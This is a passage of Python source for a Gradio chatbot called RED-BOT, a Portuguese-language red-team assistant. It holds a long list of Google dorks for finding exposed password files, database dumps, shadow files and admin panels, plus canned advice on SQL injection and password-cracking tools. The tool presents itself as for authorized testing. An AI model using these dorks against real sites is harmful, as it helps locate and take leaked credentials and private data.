"# -FrontPage-" ext:pwd inurl:(service | authors | administrators | users)
"# mysql dump" filetype:sql
"# mysql dump" filetype:sql 21232f297a57a5a743894a0e4a801fc3
"phpMyAdmin MySQL-Dump" "INSERT INTO" -"the"
"phpMyAdmin MySQL-Dump" filetype:txt
```

#### **Exposed Directories & Files**
```
"Index of /" +.htaccess
"Index of /" +passwd
"Index of /" +password.txt
"Index of /admin"
"Index of /backup"
"Index of /mail"
"Index of /password"
"Index of /wp-content/uploads/backupbuddy_backups" zip
"Index of" "database.sql"
"Index of" "logins.json" "key3.db"
"Index of" / "chat/logs"
"Index of" inurl:"/$Recycle.Bin/"
"Index of" inurl:config inurl:production
"Index of" inurl:htdocs inurl:xampp
"Index of" inurl:phpmyadmin
"Index of" inurl:webalizer
```

#### **Login Pages & Admin Panels**
```
"Login - Sun Cobalt RaQ"
"Login Name" Repository Webtop intitle:login
"Login to Usermin" inurl:20000
"Joomla! Administration Login" inurl:"/index.php"
"PaperCut Login"
"IMail Server Web Messaging" intitle:login
"HostingAccelerator" intitle:"login" +"Username" -"news" -demo
```

#### **Vulnerable Applications**
```
"Powered by Coppermine Photo Gallery"
"Powered by WordPress" -html filetype:php -demo -wordpress.org -bugtraq
"Powered by phpBB" inurl:"index.php?s" OR inurl:"index.php?style"
"Powered by CuteNews"
"Powered by SMF"
"Powered by PunBB"
"Powered by vBulletin Version 5.5.4"
"Powered by Drupal" -demo -bugtraq
```

#### **Sensitive Information**
```
"SECRET//NOFORN" ext:pdf
"SERVER_ADDR" "SERVER_PORT" "SERVER_NAME" ext:log
"HTTP_FROM=googlebot" googlebot.com "Server_Software="
"END_FILE" inurl:"/password.log"
"OTL logfile" "by OldTimer" ext:txt
"Logfile of Trend Micro HijackThis" ext:log
```

#### **Network & Infrastructure**
```
"Cisco PIX Security Appliance Software Version" + "Serial Number" + "show ver" -inurl
"IBM Security AppScan Report" ext:pdf
"Host Vulnerability Summary Report"
"Network Vulnerability Assessment Report"
"APC Console Port Management Server" intitle:"Console Port Management Server"
```

#### **File Upload & Download**
```
"Instant Free File Uploader"
"File Upload Manager v1.3" "rename to"
"Powered by Absolute File Send"
"Powered by PHP Advanced Transfer Manager v1.30"
```

#### **Error Messages & Debug Info**
```
"ORA-00921: unexpected end of SQL command"
"ORA-00933: SQL command not properly ended"
"ORA-00936: missing expression"
"PHP Fatal error: require()" ext:log
"Parse error: parse error, unexpected T_VARIABLE" "on line" filetype:php
```

#### **Web Servers & Applications**
```
"Microsoft-IIS/* server at" intitle:index.of
"Microsoft-IIS/4.0" intitle:index.of
"Microsoft-IIS/5.0 server at"
"Microsoft-IIS/6.0" intitle:index.of
"Apache Subversion" intitle:"index of"
"OpenSSL" AND "1.0.1 Server at"
```

#### **CMS & Blog Systems**
```
"Powered by Joomla!" -demo
"Powered by Drupal" -demo
"Powered by Magento"
"Powered by PrestaShop"
"Powered by OpenCart"
"Powered by WooCommerce"
```

#### **Mail Servers & Communication**
```
"Powered by IceWarp Software" inurl:mail
"Powered by SquirrelMail"
"Powered by Roundcube"
"Merak Mail Server Software" -.gov -.mil -.edu
```

#### **Development & Debug**
```
"PHP Version" inurl:/php/phpinfo.php
"phpinfo()" filetype:php
"DEBUG" ext:log
"error_log" ext:log
"access_log" ext:log
```

#### **Cloud & Infrastructure**
```
"CF-Host-Origin-IP" "CF-Int-Brand-ID" "CF-RAY" "CF-Visitor" "github" -site:github.com
"Amazon S3" "Access Denied" -amazon.com
"Microsoft Azure" "Server Error" -microsoft.com
```

#### **IoT & Embedded Devices**
```
"ADS-B Receiver Live Dump1090 Map"
"Phaser 6250" "Printer Neighborhood" "XEROX CORPORATION"
"RICOH Network Printer D model-Restore Factory"
"Remote Supervisor Adapter II" inurl:userlogin_logo.ssi
```

### **Advanced Search Techniques**
```
# Find exposed Git repositories
".git" intitle:"Index of"

# Find backup files
"backup.sql" ext:sql -git
"backup.zip" -git

# Find configuration files
"config.php" ext:php -git
"web.config" ext:config -git

# Find database dumps
"Dumping data for table" ext:sql
"-- MySQL dump" ext:sql -git

# Find log files
"error_log" ext:log
"access_log" ext:log
"debug.log" ext:log

# Find password files
"passwd" ext:txt -git
"shadow" ext:txt -git
"passwords.txt" -git
```

⚠️ **Disclaimer**: Use only for authorized security testing and research. Always obtain explicit permission before performing security assessments.

Use `/osint <consulta>` para buscar informações!"""

        elif any(word in message_lower for word in ['sql', 'web', 'aplicação', 'vulnerabilidade']):
            response = """🛡️ **Segurança de Aplicações Web:**

**Vulnerabilidades comuns:**
• SQL Injection - Manipulação de consultas SQL
• XSS (Cross-Site Scripting) - Injeção de código JavaScript
• CSRF - Requisições maliciosas cross-site
• Directory Traversal - Acesso a arquivos não autorizados

**Ferramentas de teste:**
• Burp Suite - Proxy para análise de tráfego
• OWASP ZAP - Scanner de vulnerabilidades
• SQLMap - Automatização de SQL Injection
• Nikto - Scanner de vulnerabilidades web

**Headers de segurança importantes:**
```
Content-Security-Policy
X-Frame-Options
X-XSS-Protection
Strict-Transport-Security
```

Use `/sqltest <URL>` para testar SQL Injection!"""

        elif any(word in message_lower for word in ['senha', 'password', 'hash', 'crack']):
            response = """🔐 **Password Cracking e Análise:**

**Tipos de ataque:**
• Força bruta - Testa todas as combinações
• Ataque de dicionário - Usa listas de senhas comuns
• Rainbow tables - Hashes pré-computados
• Ataques híbridos - Combina técnicas

**Ferramentas principais:**
• Hashcat - GPU-accelerated password cracking
• John the Ripper - CPU password cracker
• Hydra - Força bruta para serviços de rede
• Medusa - Alternative para Hydra

**Hashes comuns:**
```
MD5: 32 caracteres hex
SHA1: 40 caracteres hex
SHA256: 64 caracteres hex
NTLM: 32 caracteres hex
```

Use `/hashcrack <hash>` para quebrar hash MD5!"""

        else:
            response = """🤖 **RED-BOT - Assistente de Red Team**

Olá! Sou especializado em:

🔍 **OSINT** - Coleta de informações
🛡️ **Web Security** - Análise de vulnerabilidades
🔐 **Password Cracking** - Quebra de senhas
🐍 **Python** - Automação e ferramentas

**Como posso ajudar?**
• Tirar dúvidas sobre técnicas de hacking ético
• Melhorar e criar códigos Python
• Automatizar tarefas de segurança
• Organizar documentação técnica

Digite `/help` para ver comandos práticos ou me faça uma pergunta específica sobre segurança cibernética!

⚠️ **Lembre-se:** Sempre teste apenas em sistemas autorizados!"""

        return response

def create_interface():
    """Cria a interface Gradio do RED-BOT"""
    
    bot = RedBot()
    
    css = """
    /* Enhanced Bordeaux & Wine Theme with Matte Finishes */
    .gradio-container {
        background: linear-gradient(135deg, #1a0f0f 0%, #2a1818 30%, #3a2020 100%) !important;
        font-family: 'JetBrains Mono', 'Fira Code', monospace !important;
        color: #E8D5D5 !important;
        padding: 20px !important;
    }

    /* Container */
    .contain {
        max-width: 1200px !important;
        margin: 0 auto !important;
        background: rgba(42, 24, 24, 0.6) !important;
        border-radius: 12px !important;
        border: 1px solid #5a2a2a !important;
        box-shadow: 0 8px 32px rgba(114, 47, 55, 0.2) !important;
        backdrop-filter: blur(10px) !important;
        overflow: hidden !important;
    }

    /* Header Styling */
    .header-section {
        background: linear-gradient(135deg, #2a1818 0%, #3a2020 100%) !important;
        border-bottom: 1px solid #5a2a2a !important;
        padding: 20px !important;
        border-radius: 12px 12px 0 0 !important;
        margin: -20px -20px 20px -20px !important;
    }

    /* Subtle Glow Effects */
    .neon-glow {
        box-shadow: 0 0 15px rgba(160, 160, 160, 0.2), 0 0 30px rgba(160, 160, 160, 0.1) !important;
        border: 1px solid #404040 !important;
        background: linear-gradient(135deg, #161618 0%, #212124 100%) !important;
    }

    .cyber-button {
        background: linear-gradient(135deg, #4a2525 0%, #3a1a1a 100%) !important;
        color: #E8D5D5 !important;
        border: 1px solid #722f37 !important;
        box-shadow: 0 4px 6px rgba(114, 47, 55, 0.3) !important;
        transition: all 0.3s ease !important;
        border-radius: 8px !important;
        font-weight: 500 !important;
        padding: 12px 16px !important;
        min-height: auto !important;
    }

    .cyber-button:hover {
        box-shadow: 0 6px 12px rgba(114, 47, 55, 0.4), 0 0 20px rgba(138, 43, 226, 0.3) !important;
        background: linear-gradient(135deg, #5a2a2a 0%, #4a2525 100%) !important;
        transform: translateY(-2px) !important;
        border-color: #8b2635 !important;
    }

    .cyber-button:active {
        transform: translateY(0) !important;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2) !important;
    }

    /* Chat Messages */
    .chat-message {
        background: linear-gradient(135deg, #2a1818 0%, #3a2020 100%) !important;
        border-left: 3px solid #722f37 !important;
        border-radius: 8px !important;
        margin: 12px 0 !important;
        padding: 16px !important;
        box-shadow: 0 4px 8px rgba(114, 47, 55, 0.2) !important;
        backdrop-filter: blur(5px) !important;
        animation: fadeIn 0.3s ease-out !important;
    }

    .chat-message.user {
        background: linear-gradient(135deg, #3a2020 0%, #4a2525 100%) !important;
        border-left-color: #8b2635 !important;
    }

    .chat-message.bot {
        background: linear-gradient(135deg, #2a1818 0%, #2d1a1a 100%) !important;
        border-left-color: #722f37 !important;
    }

    /* Typography */
    h1, h2, h3, h4 {
        font-family: 'JetBrains Mono', monospace !important;
        color: #C0C0C0 !important;
        text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;
        font-weight: 600 !important;
        margin: 10px 0 !important;
    }

    h1 {
        font-size: 2.2em !important;
        margin-bottom: 5px !important;
    }

    h2 {
        font-size: 1.8em !important;
    }

    h3 {
        font-size: 1.5em !important;
        color: #D0D0D0 !important;
    }

    body, p, div {
        color: #E0E0E0 !important;
        line-height: 1.6 !important;
    }

    /* Code blocks */
    pre, code {
        background: #0C0C0C !important;
        border: 1px solid #252525 !important;
        border-radius: 6px !important;
        padding: 10px !important;
        font-family: 'JetBrains Mono', monospace !important;
        overflow-x: auto !important;
    }

    /* Icons */
    .feather-icon {
        width: 20px !important;
        height: 20px !important;
        fill: none !important;
        stroke: #A0A0A0 !important;
        stroke-width: 2 !important;
        filter: drop-shadow(0 1px 2px rgba(0, 0, 0, 0.5)) !important;
        margin-right: 8px !important;
        opacity: 0.9 !important;
        transition: stroke 0.3s ease !important;
    }

    .feather-icon.main-title {
        width: 40px !important;
        height: 40px !important;
        stroke: #C0C0C0 !important;
    }

    /* Sidebar */
    .cyber-sidebar {
        background: linear-gradient(135deg, #121212 0%, #191919 100%) !important;
        border: 1px solid #2A2A2A !important;
        border-radius: 10px !important;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3) !important;
        backdrop-filter: blur(10px) !important;
        padding: 20px !important;
        height: fit-content !important;
    }

    /* Input Fields */
    input, textarea {
        background: linear-gradient(135deg, #0C0C0C 0%, #161618 100%) !important;
        border: 1px solid #333333 !important;
        color: #E0E0E0 !important;
        border-radius: 8px !important;
        box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.4) !important;
        padding: 12px !important;
        font-family: 'JetBrains Mono', monospace !important;
        transition: all 0.3s ease !important;
    }

    input:focus, textarea:focus {
        box-shadow: 0 0 0 2px rgba(100, 100, 100, 0.3), inset 0 2px 4px rgba(0, 0, 0, 0.4) !important;
        outline: none !important;
        border-color: #606060 !important;
    }

    /* Message Input Area */
    .message-input-container {
        display: flex !important;
        gap: 10px !important;
        align-items: center !important;
    }

    .message-input-container input {
        flex: 1 !important;
        border-radius: 8px 0 0 8px !important;
    }

    .message-input-container button {
        border-radius: 0 8px 8px 0 !important;
        margin: 0 !important;
        height: 100% !important;
    }

    /* Subtle Animations */
    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
    }

    @keyframes subtle-pulse {
        0% { box-shadow: 0 0 5px rgba(160, 160, 160, 0.1); }
        50% { box-shadow: 0 0 15px rgba(160, 160, 160, 0.2), 0 0 25px rgba(160, 160, 160, 0.05); }
        100% { box-shadow: 0 0 5px rgba(160, 160, 160, 0.1); }
    }

    .pulse {
        animation: subtle-pulse 4s infinite !important;
    }

    /* Mobile Responsiveness */
    @media (max-width: 768px) {
        .gradio-container {
            padding: 10px !important;
            background: #0A0A0A !important;
        }
        
        .contain {
            margin: 0 !important;
            border-radius: 8px !important;
            border: none !important;
            box-shadow: none !important;
        }
        
        .header-section {
            padding: 15px !important;
            margin: -10px -10px 15px -10px !important;
        }
        
        .cyber-sidebar {
            margin-top: 15px !important;
            padding: 15px !important;
            background: #121212 !important;
            border-radius: 8px !important;
        }
        
        .chat-message {
            padding: 12px !important;
            margin: 8px 0 !important;
            border-radius: 6px !important;
        }
        
        .feather-icon {
            width: 18px !important;
            height: 18px !important;
        }
        
        .feather-icon.main-title {
            width: 32px !important;
            height: 32px !important;
        }
        
        h1 {
            font-size: 1.8em !important;
        }
        
        h2 {
            font-size: 1.5em !important;
        }
        
        .cyber-button {
            min-height: 48px !important;
            font-size: 1em !important;
            padding: 12px 16px !important;
        }
        
        input, textarea {
            min-height: 48px !important;
            font-size: 1em !important;
            padding: 12px !important;
        }
        
        .message-input-container {
            flex-direction: column !important;
        }
        
        .message-input-container input {
            border-radius: 8px !important;
            width: 100% !important;
        }
        
        .message-input-container button {
            border-radius: 8px !important;
            width: 100% !important;
        }
    }

    /* Tablet Responsiveness */
    @media (min-width: 769px) and (max-width: 1024px) {
        .cyber-sidebar {
            padding: 15px !important;
        }
    }

    /* Touch Targets */
    button, .cyber-button, input, textarea {
        min-height: 44px !important;
        min-width: 44px !important;
    }

    /* Scrollbar Styling */
    ::-webkit-scrollbar {
        width: 10px !important;
    }

    ::-webkit-scrollbar-track {
        background: #0A0A0A !important;
        border-radius: 5px !important;
    }

    ::-webkit-scrollbar-thumb {
        background: #333333 !important;
        border-radius: 5px !important;
    }

    ::-webkit-scrollbar-thumb:hover {
        background: #404040 !important;
    }

    /* Feedback buttons */
    .feedback-container {
        justify-content: center !important;
        gap: 10px !important;
        margin: 10px 0 !important;
    }

    .feedback-btn {
        background: linear-gradient(135deg, #212427 0%, #1D1F21 100%) !important;
        color: #E0E0E0 !important;
        border: 1px solid #404040 !important;
        border-radius: 8px !important;
        padding: 8px 12px !important;
        font-size: 1.2em !important;
        transition: all 0.3s ease !important;
    }

    .feedback-btn:hover {
        background: linear-gradient(135deg, #2A2A2A 0%, #252525 100%) !important;
        box-shadow: 0 0 10px rgba(160, 160, 160, 0.3) !important;
    }

    /* Markdown styling */
    .prose {
        color: #E0E0E0 !important;
    }

    .prose a {
        color: #A0A0A0 !important;
        text-decoration: underline !important;
    }

    .prose a:hover {
        color: #C0C0C0 !important;
    }

    /* Table styling */
    table {
        border-collapse: collapse !important;
        width: 100% !important;
        margin: 15px 0 !important;
    }

    table, th, td {
        border: 1px solid #404040 !important;
    }

    th, td {
        padding: 8px 12px !important;
        text-align: left !important;
    }

    th {
        background: #212427 !important;
        color: #C0C0C0 !important;
    }

    td {
        background: #191919 !important;
    }
    """
    
    with gr.Blocks(
        css=css,
        title="RED-BOT - Red Team Assistant"
    ) as interface:
        
        gr.HTML("""
        <!-- Feather Icons SVG Sprite -->
        <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
            <defs>
                <symbol id="shield" viewBox="0 0 24 24">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                </symbol>
                <symbol id="help-circle" viewBox="0 0 24 24">
                    <circle cx="12" cy="12" r="10"/>
                    <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/>
                    <line x1="12" y1="17" x2="12.01" y2="17"/>
                </symbol>
                <symbol id="search" viewBox="0 0 24 24">
                    <circle cx="11" cy="11" r="8"/>
                    <line x1="21" y1="21" x2="16.65" y2="16.65"/>
                </symbol>
                <symbol id="send" viewBox="0 0 24 24">
                    <line x1="22" y1="2" x2="11" y2="13"/>
                    <polygon points="22 2 15 22 11 13 2 9 22 2"/>
                </symbol>
                <symbol id="eye" viewBox="0 0 24 24">
                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                    <circle cx="12" cy="12" r="3"/>
                </symbol>
                <symbol id="lock" viewBox="0 0 24 24">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                </symbol>
                <symbol id="globe" viewBox="0 0 24 24">
                    <circle cx="12" cy="12" r="10"/>
                    <line x1="2" y1="12" x2="22" y2="12"/>
                    <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
                </symbol>
                <symbol id="zap" viewBox="0 0 24 24">
                    <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>
                </symbol>
                <symbol id="alert-triangle" viewBox="0 0 24 24">
                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
                    <line x1="12" y1="9" x2="12" y2="13"/>
                    <line x1="12" y1="17" x2="12.01" y2="17"/>
                </symbol>
                <symbol id="terminal" viewBox="0 0 24 24">
                    <polyline points="4 17 10 11 4 5"/>
                    <line x1="12" y1="19" x2="20" y2="19"/>
                </symbol>
                <symbol id="code" viewBox="0 0 24 24">
                    <polyline points="16 18 22 12 16 6"/>
                    <polyline points="8 6 2 12 8 18"/>
                </symbol>
                <symbol id="database" viewBox="0 0 24 24">
                    <ellipse cx="12" cy="5" rx="9" ry="3"/>
                    <path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/>
                    <path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/>
                </symbol>
                <symbol id="command" viewBox="0 0 24 24">
                    <path d="M18 3a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2 2 2 0 0 0 2-2V5a2 2 0 0 0-2-2z"/>
                    <path d="M6 3a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2 2 2 0 0 0 2-2V5a2 2 0 0 0-2-2z"/>
                </symbol>
            </defs>
        </svg>

        <div class="header-section">
            <h1 style="text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; gap: 15px;">
                <svg class="feather-icon main-title"><use href="#shield"></use></svg>
                RED-BOT
            </h1>
            <p style="text-align: center; color: #A0A0A0; margin: 10px 0 0 0; font-size: 1.1em;">
                Assistente Especializado em Red Team e Ethical Hacking
            </p>
        </div>
        """)
        
        with gr.Row(equal_height=False):
            with gr.Column(scale=3, min_width=600):
                chatbot = gr.Chatbot(
                    height=650,
                    show_label=False,
                    elem_classes=["chat-message"],
                    type='messages',
                    avatar_images=(None, None),  # Remove default avatars since we're using custom styling
                    elem_id="chatbot-container"
                )

                # Feedback buttons
                with gr.Row(elem_classes=["feedback-container"]):
                    like_btn = gr.Button("👍 Curtir", elem_classes=["feedback-btn"])
                    dislike_btn = gr.Button("👎 Não curtir", elem_classes=["feedback-btn"])

                with gr.Row(elem_classes=["message-input-container"]):
                    msg = gr.Textbox(
                        placeholder="Digite sua pergunta ou comando (ex: /help, /osint, /sqltest)...",
                        show_label=False,
                        scale=4,
                        container=False,
                        elem_id="message-input"
                    )
                    send_btn = gr.Button(
                        "Enviar", 
                        variant="primary", 
                        scale=1, 
                        elem_classes=["cyber-button"],
                        elem_id="send-button"
                    )
            
            with gr.Column(scale=1, min_width=250, elem_id="sidebar-column"):
                gr.HTML("""
                <div class="cyber-sidebar">
                    <h3 style="display: flex; align-items: center; gap: 8px; margin-top: 0; margin-bottom: 15px;">
                        <svg class="feather-icon"><use href="#zap"></use></svg>
                        Comandos Rápidos
                    </h3>
                    <div style="font-family: monospace; font-size: 0.95em; line-height: 2.2;">
                        <div style="margin-bottom: 12px; display: flex; align-items: flex-start; gap: 8px;">
                            <svg class="feather-icon" style="width: 18px; height: 18px; flex-shrink: 0;"><use href="#help-circle"></use></svg>
                            <div>
                                <strong>/help</strong><br>
                                <span style="color: #A0A0A0; font-size: 0.85em;">Mostra todos os comandos disponíveis</span>
                            </div>
                        </div>
                        <div style="margin-bottom: 12px; display: flex; align-items: flex-start; gap: 8px;">
                            <svg class="feather-icon" style="width: 18px; height: 18px; flex-shrink: 0;"><use href="#search"></use></svg>
                            <div>
                                <strong>/osint &lt;consulta&gt;</strong><br>
                                <span style="color: #A0A0A0; font-size: 0.85em;">Busca informações com Google Dorking</span>
                            </div>
                        </div>
                        <div style="margin-bottom: 12px; display: flex; align-items: flex-start; gap: 8px;">
                            <svg class="feather-icon" style="width: 18px; height: 18px; flex-shrink: 0;"><use href="#lock"></use></svg>
                            <div>
                                <strong>/sqltest &lt;URL&gt;</strong><br>
                                <span style="color: #A0A0A0; font-size: 0.85em;">Testa vulnerabilidades SQL Injection</span>
                            </div>
                        </div>
                        <div style="margin-bottom: 12px; display: flex; align-items: flex-start; gap: 8px;">
                            <svg class="feather-icon" style="width: 18px; height: 18px; flex-shrink: 0;"><use href="#lock"></use></svg>
                            <div>
                                <strong>/hashcrack &lt;hash&gt;</strong><br>
                                <span style="color: #A0A0A0; font-size: 0.85em;">Quebra hashes MD5</span>
                            </div>
                        </div>
                        <div style="margin-bottom: 12px; display: flex; align-items: flex-start; gap: 8px;">
                            <svg class="feather-icon" style="width: 18px; height: 18px; flex-shrink: 0;"><use href="#globe"></use></svg>
                            <div>
                                <strong>/subdomain &lt;dominio&gt;</strong><br>
                                <span style="color: #A0A0A0; font-size: 0.85em;">Busca subdomínios de um domínio</span>
                            </div>
                        </div>
                        <div style="margin-bottom: 12px; display: flex; align-items: flex-start; gap: 8px;">
                            <svg class="feather-icon" style="width: 18px; height: 18px; flex-shrink: 0;"><use href="#eye"></use></svg>
                            <div>
                                <strong>/xss</strong><br>
                                <span style="color: #A0A0A0; font-size: 0.85em;">Análise de vulnerabilidades XSS</span>
                            </div>
                        </div>
                        <div style="margin-bottom: 12px; display: flex; align-items: flex-start; gap: 8px;">
                            <svg class="feather-icon" style="width: 18px; height: 18px; flex-shrink: 0;"><use href="#shield"></use></svg>
                            <div>
                                <strong>/idor</strong><br>
                                <span style="color: #A0A0A0; font-size: 0.85em;">Análise de IDOR</span>
                            </div>
                        </div>
                        <div style="margin-bottom: 12px; display: flex; align-items: flex-start; gap: 8px;">
                            <svg class="feather-icon" style="width: 18px; height: 18px; flex-shrink: 0;"><use href="#alert-triangle"></use></svg>
                            <div>
                                <strong>/csrf</strong><br>
                                <span style="color: #A0A0A0; font-size: 0.85em;">Análise de CSRF</span>
                            </div>
                        </div>
                        <div style="margin-bottom: 12px; display: flex; align-items: flex-start; gap: 8px;">
                            <svg class="feather-icon" style="width: 18px; height: 18px; flex-shrink: 0;"><use href="#globe"></use></svg>
                            <div>
                                <strong>/ssrf</strong><br>
                                <span style="color: #A0A0A0; font-size: 0.85em;">Análise de SSRF</span>
                            </div>
                        </div>
                        <div style="margin-bottom: 12px; display: flex; align-items: flex-start; gap: 8px;">
                            <svg class="feather-icon" style="width: 18px; height: 18px; flex-shrink: 0;"><use href="#lock"></use></svg>
                            <div>
                                <strong>/auth_reset</strong><br>
                                <span style="color: #A0A0A0; font-size: 0.85em;">Análise de reset de autenticação</span>
                            </div>
                        </div>
                    </div>
                </div>
                """)
                
                gr.HTML("""
                <div style="background: linear-gradient(135deg, #0C0C0C 0%, #161618 100%); padding: 16px; border-radius: 10px; border: 1px solid #2A2A2A; margin-top: 20px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); backdrop-filter: blur(5px);">
                    <h4 style="display: flex; align-items: center; gap: 8px; margin-top: 0; margin-bottom: 10px; color: #A0A0A0;">
                        <svg class="feather-icon" style="fill: #A0A0A0;"><use href="#alert-triangle"></use></svg>
                        Aviso Legal
                    </h4>
                    <p style="font-size: 0.9em; line-height: 1.5; margin: 0; color: #C0C0C0;">
                        Use apenas em sistemas autorizados. Este bot é para fins educacionais e de segurança defensiva.
                    </p>
                </div>
                """)
        
        def respond(message, chat_history):
            return bot.process_message(message, chat_history)
        
        msg.submit(respond, [msg, chatbot], [msg, chatbot])
        send_btn.click(respond, [msg, chatbot], [msg, chatbot])

        # Feedback buttons
        like_btn.click(lambda: bot.give_positive_feedback(), inputs=[], outputs=[])
        dislike_btn.click(lambda: bot.give_negative_feedback(), inputs=[], outputs=[])
    
    return interface

if __name__ == "__main__":
    print("🛡️ Iniciando RED-BOT...")
    print("📊 Carregando interface Gradio...")
    
    interface = create_interface()
    
    print("🚀 RED-BOT está rodando!")
    print("🌐 Acesse: http://localhost:7860")
    print("⚠️  Lembre-se: Use apenas em sistemas autorizados!")
    
    interface.launch(
        server_name="0.0.0.0",
        server_port=7860,
        share=False,
        show_api=False,
        show_error=True
    )
